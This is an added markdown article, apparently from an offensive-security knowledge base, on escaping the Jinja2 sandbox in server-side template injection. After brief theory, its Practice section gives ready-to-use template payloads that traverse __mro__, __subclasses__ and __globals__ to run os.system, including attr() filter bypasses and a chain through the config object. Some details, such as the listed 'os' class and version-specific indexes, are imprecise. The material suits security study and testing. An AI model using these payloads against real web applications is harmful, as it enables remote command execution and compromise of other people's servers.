@@ -1,0 +1,115 @@
+---
+title: Mastering Jinja2 Sandbox Escapes Techniques
+description: Explore key strategies for bypassing Jinja2 sandbox restrictions in SSTI,
+  enabling command execution and vulnerability exploitation.
+keywords:
+- sandbox escape
+- Jinja2
+- SSTI
+- Python
+- __import__ bypass
+- __builtins__ access
+- __subclasses__
+- attr() function
+- sandboxing
+---
+
+# Sandbox Escapes
+
+## Context
+
+This article focuses on exploiting sandbox escapes in server-side template injection (SSTI) scenarios, particularly with Python's Jinja2 template engine. The reader should have prior understanding of sandboxing concepts, template engine mechanisms, and Python interpreter basics. Familiarity with the fundamentals of Server Side Template Injection is also assumed.
+
+## Theory
+
+### Sandboxing in Template Engines
+
+Sandboxing aims to restrict the execution of template code to prevent access to potentially dangerous functions or objects in the system environment. Within SSTI sandboxes, these restrictions attempt to block access to Python built-ins, imports, and sensitive attributes to mitigate the risk of arbitrary code execution.
+
+### Common Sandbox Escape Vectors in Jinja2/Python
+
+Sandbox escapes take advantage of inadequate filtering or logical flaws to access restricted Python objects. Attackers may employ techniques such as attribute access chaining, class hierarchy traversal, or filter bypasses to reach and execute sensitive functionalities. 
+
+### Key Techniques for Sandbox Escape
+
+#### __import__ Bypass
+
+This technique involves accessing Python's import mechanism through template expressions, thereby reaching functionalities that are otherwise restricted.
+
+#### __builtins__ Access
+
+By leveraging the context of a template, it's possible to access Python's built-in functions and objects, effectively bypassing sandbox restrictions.
+
+#### __subclasses__ Enumeration
+
+By traversing class hierarchies, an attacker can locate and instantiate classes which are powerful enough to perform system-level operations.
+
+#### attr() Function Bypass
+
+Utilizing the `attr()` function, attackers can dynamically access otherwise restricted attributes, bypassing certain access controls.
+
+#### Filter/Whitelist Bypass
+
+Through creative attribute or method access, attackers can circumvent blacklists or whitelists designed to block dangerous functionalities.
+
+#### globals() Access Bypass
+
+Gaining access to the global namespace can allow attackers to manipulate or execute arbitrary code, greatly expanding the potential attack surface.
+
+### Class Hierarchy and MRO Exploitation
+
+Python’s Method Resolution Order (MRO) and `__subclasses__` method facilitate the traversal of class relationships. By enumerating subclasses, attackers can locate classes like `file`, `os`, or `subprocess` and employ them for code execution.
+
+## Practice
+
+### Accessing __import__ via Jinja2 Expression
+
+- **Step 1**: Enumerate subclasses to find `warnings.catch_warnings` or similar using the following payload:
+  
+    ```python
+    {{ [].__class__.__mro__[1].__subclasses__() }}
+    ```
+
+- **Step 2**: Once identified, achieve command execution by escaping the sandbox and invoking system commands:
+
+    ```python
+    {{ [].__class__.__mro__[1].__subclasses__()[<index>].__init__.__globals__['__builtins__']['__import__']('os').system('id') }}
+    ```
+
+    Replace `<index>` with the correct subclass index.
+
+### Bypassing Filters with attr() Function
+
+- **Step 1**: Identify useful subclasses using this payload:
+
+    ```python
+    {{ ''.__class__.__mro__[2].__subclasses__() }}
+    ```
+
+- **Step 2**: Use `attr()` to bypass access restrictions and execute arbitrary commands:
+
+    ```python
+    {{ ''.__class__.__mro__[2].__subclasses__()[<index>]|attr('__init__')|attr('__globals__')|attr('__builtins__')|attr('__import__')('os').system('id') }}
+    ```
+
+### Accessing Built-ins via globals()
+
+- **Step 1**: Directly access 'os' in globals with this payload:
+
+    ```python
+    {{''.__class__.__mro__[1].__subclasses__()[<index>].__init__.__globals__['os'].system('id')}}
+    ```
+
+### Chaining Whitelist Bypasses
+
+- **Step 1**: Leverage template context to reach sensitive classes using:
+
+    ```python
+    {{ config.items()[0][1].__class__.__mro__[2].__subclasses__()[<index>].__init__.__globals__['os'].system('id') }}
+    ```
+
+## Tools
+
+- **Burp Suite**
+- **curl**
+- **wfuzz** 
